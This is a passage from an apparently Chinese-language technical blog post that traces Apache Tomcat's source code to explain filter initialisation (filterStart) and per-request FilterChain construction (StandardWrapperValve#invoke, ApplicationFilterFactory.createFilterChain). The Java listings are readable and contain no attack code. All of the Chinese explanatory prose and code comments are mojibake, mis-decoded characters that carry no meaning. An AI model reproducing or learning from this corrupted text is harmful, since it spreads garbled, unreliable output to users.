</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getFilterMappings</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">context</span><span class="o">.</span><span class="na">addFilterMap</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Êé•ÁùÄTomcatÂú®ÂêØÂä®‰∏≠‰ºöË∞ÉÁî®StandardContext#startInternal()ÔºåstartInternal()‰ºöÊé•ÁùÄË∞ÉÁî® StanddardContext#filterStart()ÊñπÊ≥ïÊù•ÂØπfilterËøõË°åÂàùÂßãÂåñÔºõ <!-- raw HTML omitted --></p>
<p>ÂÖ∂‰ºö‰∏∫Êàë‰ª¨‰πãÂâç‰øùÂ≠òÁöÑÊØè‰∏Ä‰∏™ <code>FilterDef</code> ÈÉΩÂàõÂª∫‰∏Ä‰∏™ <code>FilterConfig</code> Êù•Â∞ÅË£Ö‰øùÂ≠ò‰ø°ÊÅØÔºõ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">filterStart</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Instantiate and record a FilterConfig for each defined filter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">boolean</span> <span class="n">ok</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">filterConfigs</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">filterConfigs</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">FilterDef</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">filterDefs</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">getLogger</span><span class="o">().</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">getLogger</span><span class="o">().</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34; Starting filter &#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34;&#39;&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ‰∏∫ÊØè‰∏Ä‰∏™filterDefÈÉΩÂàõÂª∫‰∏Ä‰∏™filterConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">                        <span class="k">new</span> <span class="n">ApplicationFilterConfig</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Â∞ÜÂàõÂª∫ÁöÑfilterConfigÂ≠òÂÖ•filterConfigs‰∏≠
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">t</span> <span class="o">=</span> <span class="n">ExceptionUtils</span><span class="o">.</span><span class="na">unwrapInvocationTargetException</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ExceptionUtils</span><span class="o">.</span><span class="na">handleThrowable</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">getLogger</span><span class="o">().</span><span class="na">error</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span>
</span></span><span class="line"><span class="cl">                        <span class="s">&#34;standardContext.filterStart&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">),</span> <span class="n">t</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ok</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ok</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Ëá≥Ê≠§ÔºåFilterÁöÑÂàùÂßãÂåñ‰πüÂÆåÊàê‰∫ÜÔºåTomcatÊúçÂä°Âô®Â∑≤ÁªèÂºÄÂßãÊ≠£Â∏∏ËøêË°åÔºåÊé•ÁùÄÊàë‰ª¨Êù•ÁúãÂÖ∑‰ΩìÂú®Â§ÑÁêÜËØ∑Ê±ÇÊó∂ÔºåTomcatÂÅö‰∫Ü‰ªÄ‰πàÔºõ <!-- raw HTML omitted --></p>
<h4 id="filterËøáÊª§ËØ∑Ê±Ç">FilterËøáÊª§ËØ∑Ê±Ç</h4>
<p>ÂΩìTomcatÊé•ÂèóÂà∞Êù•Ëá™ÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±Ç‰πãÂêéÔºå‰ºöÈÄöËøáConnectorËøûÊé•Âô®Â∞ÜËØ∑Ê±ÇÂ∞ÅË£ÖÊàêServletRequestÂØπË±°ÔºåÂπ∂‰º†ÈÄíÁªôContainerÂÆπÂô®ËøõË°åÂÖ∑‰ΩìÁöÑÂ§ÑÁêÜÔºåËÄåContainerÂàôÂà©Áî®PipelineValveË¥£‰ªªÈìæÁöÑÊ®°Âºè‰∏çÊñ≠Ê†πÊçÆHTTPËØ∑Ê±ÇÁöÑ‰ø°ÊÅØÂ∞ÜËØ∑Ê±Ç‰∫§Áî±‰∏çÂêåÁöÑContainerÂ≠êÂÆπÂô®ËøõË°åÂ§ÑÁêÜÔºåÂÖ∑‰ΩìÁöÑËøáÁ®ã‰∏çÂÜçËµòËø∞Ôºõ <!-- raw HTML omitted --></p>
<p>Êàë‰ª¨Êâì‰∏äÊñ≠ÁÇπÊ†πÊçÆË∞ÉÁî®Ê†àÊù•Áúã‰∏Ä‰∏ãFilterÊòØÂ¶Ç‰ΩïË¢´Ë∞ÉÁî®ÁöÑÔºö <!-- raw HTML omitted --></p>
<p>Ë¥£‰ªªÈìæÁöÑÁªàÁÇπÊù•Âà∞ <strong>StandardWrapperValve#invoke()</strong> ÊñπÊ≥ïÔºö <!-- raw HTML omitted --></p>
<ol>
<li>ÂÖàÊòØÂàõÂª∫ServletÂÆû‰æãÔºõ <!-- raw HTML omitted --></li>
<li>ÂÜçÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑFilterChainÂÆû‰æãÔºàFilterChain‰πüÊòØ‰∏Ä‰∏™Ë¥£‰ªªÈìæÔºåÂ∞ÜÂØπ‰∫éËØ∑Ê±ÇÁöÑËøáÊª§Ë°å‰∏∫ÂàÜÊï£Âà∞‰∫ÜÂ§ö‰∏™Filter‰∏äÔºâÔºõ <!-- raw HTML omitted --></li>
<li>Ë∞ÉÁî®Êñ∞ÂàõÂª∫ÁöÑFilterChainÂÆû‰æãÁöÑdoFilter()ÊñπÊ≥ïÊù•ÁªßÁª≠Â§ÑÁêÜËØ∑Ê±ÇÔºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Initialize local variables we may need
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="n">StandardWrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardWrapper</span><span class="o">)</span> <span class="n">getContainer</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Servlet</span> <span class="n">servlet</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Context</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">Context</span><span class="o">)</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getParent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Allocate a servlet instance to process this request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 1. ÂàÜÈÖç‰∏Ä‰∏™ServletÂÆû‰æã
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(!</span><span class="n">unavailable</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">servlet</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">allocate</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Create the filter chain for this request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 2. ‰ΩøÁî®FactoryÂ∑•ÂéÇÁ±ªÂàõÂª∫‰∏Ä‰∏™filterChainÂÆû‰æã
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ApplicationFilterChain</span> <span class="n">filterChain</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">                <span class="n">ApplicationFilterFactory</span><span class="o">.</span><span class="na">createFilterChain</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">wrapper</span><span class="o">,</span> <span class="n">servlet</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Call the filter chain for this request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// NOTE: This also calls the servlet&#39;s service() method
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Container</span> <span class="n">container</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">container</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((</span><span class="n">servlet</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">filterChain</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Swallow output if needed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getSwallowOutput</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">SystemLogHandler</span><span class="o">.</span><span class="na">startCapture</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncDispatching</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">request</span><span class="o">.</span><span class="na">getAsyncContextInternal</span><span class="o">().</span><span class="na">doInternalDispatch</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                            <span class="c1">// 3. Ë∞ÉÁî®ÂàõÂª∫ÁöÑfilterChainÁöÑdoFilterÊñπÊ≥ïÊù•Â§ÑÁêÜËØ∑Ê±Ç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                            <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">(),</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">response</span><span class="o">.</span><span class="na">getResponse</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncDispatching</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">request</span><span class="o">.</span><span class="na">getAsyncContextInternal</span><span class="o">().</span><span class="na">doInternalDispatch</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="c1">// 3. Ë∞ÉÁî®ÂàõÂª∫ÁöÑfilterChainÁöÑdoFilterÊñπÊ≥ïÊù•Â§ÑÁêÜËØ∑Ê±Ç
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span>
</span></span><span class="line"><span class="cl">                            <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">(),</span> <span class="n">response</span><span class="o">.</span><span class="na">getResponse</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>‰ªé‰∏äÈù¢ÁöÑÂÜÖÂÆπ‰∏≠ÔºåÊàë‰ª¨Ëé∑Âæó‰∫Ü‰∏Ä‰∏™‰ø°ÊÅØÔºåÂ∞±ÊòØTomcatÂú®ÊØèÊ¨°ÈúÄË¶ÅÂ§ÑÁêÜ‰∏Ä‰∏™ËØ∑Ê±ÇÁöÑÊó∂ÂÄôÔºåÊúÄÁªàÈÉΩ‰ºöË¢´‰∏Ä‰∏™ServletÊâÄÂ§ÑÁêÜÔºåÂπ∂‰∏îÈÉΩ‰ºö‰∏∫Ëøô‰∏™ServletÈáçÊñ∞ÊûÑÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ <strong>FilterChain</strong>, ÈÇ£‰πàËá™ÁÑ∂‰πüÂèØ‰ª•ÁåúÂà∞ÔºåFilterChain‰∏≠ÂÜÖÁΩÆÁöÑFilter‰πü‰ºöË¢´ÈáçÊñ∞Âä†ËΩΩ‰∏ÄÈÅçÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂÖ∑‰ΩìÊù•Áúã‰∏Ä‰∏ã‰∏Ä‰∏™FilterChainÁöÑÂÆû‰æãÂØπË±°ÊòØÂ¶Ç‰ΩïË¢´ÊûÑÈÄ†ÁöÑÔºö <!-- raw HTML omitted --></p>
<p>ËøôÈáåTomact‰ΩøÁî®‰∫ÜÂ∑•ÂéÇÁ±ª <strong>ApplicationFilterFactory</strong> Êù•ÊûÑÈÄ† <strong>FilterChain</strong> ÂÆû‰æãÔºåApplicaitonFilterFactory.createFilterChain(): <!-- raw HTML omitted --></p>
<ol>
<li>Ê†πÊçÆËØ∑Ê±ÇÂØπË±°ÔºåÊûÑÈÄ†‰∏Ä‰∏™ApplicationFilterChainÂÆû‰æãÔºõ <!-- raw HTML omitted --></li>
<li>FilterChainÈúÄË¶ÅÂåÖÂê´ÊâÄÂØπÂ∫îÁöÑServletÔºõ <!-- raw HTML omitted --></li>
<li>Ëé∑ÂèñDispatcher‰ª•ÂèäËØ∑Ê±ÇË∑ØÂæÑrequestPathÁöÑ‰ø°ÊÅØÔºõ <!-- raw HTML omitted --></li>
<li>Ê†πÊçÆËØ∑Ê±ÇÁöÑURLË∑ØÂæÑÂà§Êñ≠ÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÔºõ <!-- raw HTML omitted --></li>
<li>Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÂä†ËΩΩÂà∞FilterChainÂΩì‰∏≠Ôºõ <!-- raw HTML omitted --></li>
<li>Ê†πÊçÆweb.xmlÈÖçÁΩÆÊñá‰ª∂‰∏≠Ôºå&lt;filter-map&gt;Ê†áÁ≠æ‰∏≠ÁöÑÂ≠êÊ†áÁ≠æ&lt;servlet-name&gt;,Âä†ËΩΩÂì™‰∫õ‰∏ìÈó®‰∏∫ÁâπÂÆöServletÊúçÂä°ÁöÑfilter <!-- raw HTML omitted --></li>
<li>Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÂä†ËΩΩÂà∞FilterChainÂΩì‰∏≠Ôºõ <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="n">ApplicationFilterChain</span> <span class="nf">createFilterChain</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">Wrapper</span> <span class="n">wrapper</span><span class="o">,</span> <span class="n">Servlet</span> <span class="n">servlet</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. Ê†πÊçÆËØ∑Ê±ÇÂØπË±°ÔºåÊûÑÈÄ†‰∏Ä‰∏™ApplicationFilterChainÂÆû‰æãÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="n">ApplicationFilterChain</span> <span class="n">filterChain</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">Request</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">request</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filterChain</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterChain</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">filterChain</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">req</span><span class="o">.</span><span class="na">setFilterChain</span><span class="o">(</span><span class="n">filterChain</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. FilterChainÈúÄË¶ÅÂåÖÂê´ÊâÄÂØπÂ∫îÁöÑServletÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">filterChain</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">servlet</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">filterChain</span><span class="o">.</span><span class="na">setServletSupportsAsync</span><span class="o">(</span><span class="n">wrapper</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getParent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">FilterMap</span> <span class="n">filterMaps</span><span class="o">[]</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">findFilterMaps</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 3. Ëé∑ÂèñDispatcher‰ª•ÂèäËØ∑Ê±ÇË∑ØÂæÑrequestPathÁöÑ‰ø°ÊÅØÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">DispatcherType</span> <span class="n">dispatcher</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">            <span class="o">(</span><span class="n">DispatcherType</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">DISPATCHER_TYPE_ATTR</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">requestPath</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">attribute</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">DISPATCHER_REQUEST_PATH_ATTR</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">attribute</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">requestPath</span> <span class="o">=</span> <span class="n">attribute</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">servletName</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 4. Ê†πÊçÆËØ∑Ê±ÇÁöÑURLË∑ØÂæÑÂà§Êñ≠ÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersURL</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">requestPath</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 5. Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑFilterÂä†ËΩΩÂà∞FilterChainÂΩì‰∏≠Ôºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Add filters that match on servlet name second
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="o">(</span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">:</span> <span class="n">filterMaps</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 6. Ê†πÊçÆweb.xmlÈÖçÁΩÆÊñá‰ª∂‰∏≠Ôºå&lt;filter-map&gt;Ê†áÁ≠æ‰∏≠ÁöÑÂ≠êÊ†áÁ≠æ&lt;servlet-name&gt;,Âä†ËΩΩÂì™‰∫õ‰∏ìÈó®‰∏∫ÁâπÂÆöServletÊúçÂä°ÁöÑfilterÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(!</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">matchFiltersServlet</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">servletName</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
